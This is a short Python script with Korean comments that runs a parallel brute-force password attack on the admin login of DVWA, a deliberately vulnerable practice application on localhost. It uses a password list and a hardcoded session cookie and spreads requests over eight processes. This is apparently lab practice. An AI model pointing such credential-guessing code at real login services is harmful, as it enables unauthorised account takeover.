from multiprocessing import Pool
import requests
import time

url = "http://localhost/vulnerabilities/brute/"
cookie = "l6gt2gtuqki4ki22c8mq7rsuh5"
level = "medium"
head = {"PHPSESSID":f"{cookie}", "security":f"{level}"}


def read_file(filename):
    tasks = []
    with open(filename, 'r') as file:
        for line in file:
            tasks.append([line.strip()])  # 각 문자열을 리스트로 감싸서 추가
    return tasks


def brut_force(passwordList):
    global url
    global head
    for password in passwordList:
        param = f"?username=admin&password={password}&Login=Login"
        payload = url+param
        print(password)
        response = requests.get(payload, cookies=head)
        if (response.status_code == 200 and 'Welcome to the password protected area' in response.text):
            return password



# # TEST 병렬처리O
if __name__ == '__main__':
    start = int(time.time())
    num_cores = 8
    pool = Pool(num_cores)
    filename = 'tools/passwordlist.txt'
    tasks = read_file(filename)
    results = pool.map(brut_force, tasks)
    end = int(time.time())

    for result in results:
        print(result)
    print(f"걸린시간: {end-start}sec.")


# TEST 병렬처리X
# start = int(time.time())
# filename = 'tools/passwordlist.txt'
# tasks = read_file(filename)
# print(brut_force(tasks))
# end = int(time.time())
# print(f"걸린시간: {end-start}sec.")


# 코어 수 확인
# import multiprocessing

# num_cores = multiprocessing.cpu_count()
# print(f"시스템의 CPU 코어 수: {num_cores}")
